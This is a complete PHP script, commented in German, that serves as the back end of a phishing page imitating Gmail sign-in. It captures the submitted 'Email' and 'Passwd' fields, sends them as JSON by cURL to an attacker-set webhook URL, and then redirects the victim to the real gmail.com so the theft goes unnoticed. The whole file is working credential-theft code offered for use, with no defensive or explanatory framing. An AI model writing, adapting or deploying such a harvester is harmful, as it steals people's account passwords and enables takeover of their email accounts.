<?php
// Daten aus dem POST-Request erhalten
$email = $_POST['Email'] ?? '';
$password = $_POST['Passwd'] ?? '';

// Webhook-URL (ersetze 'WEBHOOK_URL' durch die tatsächliche URL deines Webhooks)
$webhook_url = 'WEBHOOK_URL';

// Daten für den POST-Request zusammenstellen
$data = [
    'email' => $email,
    'password' => $password
];

// Konvertiere die Daten in das JSON-Format
$json_data = json_encode($data);

// Konfiguration für den cURL-Request erstellen
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Content-Length: ' . strlen($json_data)
]);

// cURL-Request ausführen und die Antwort erhalten
$response = curl_exec($ch);

// Überprüfen, ob der Request erfolgreich war
if ($response === false) {
    // Fehler beim Senden des Requests
    echo 'Fehler beim Senden des Webhook-Requests: ' . curl_error($ch);
} else {
    // Erfolgreich gesendet
    echo 'Webhook-Request erfolgreich gesendet!';
}

// cURL-Verbindung schließen
curl_close($ch);

// Weiterleitung zum gewünschten Ziel (z.B. zur echten Gmail-Seite)
header('Location: http://www.gmail.com');
exit;
?>
